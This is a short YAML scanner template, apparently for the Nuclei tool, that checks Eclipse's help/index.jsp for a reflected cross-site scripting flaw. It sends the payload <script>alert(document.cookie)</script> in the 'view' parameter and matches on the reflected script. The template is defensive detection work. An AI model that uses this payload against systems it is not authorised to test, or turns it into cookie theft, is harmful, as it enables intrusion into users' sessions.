id: Eclipse XSS
info:
  author: pikpikcu
  name: Eclipse Reflected XSS vulnerability
  severity: medium
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <script>alert(document.cookie)</script>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>'
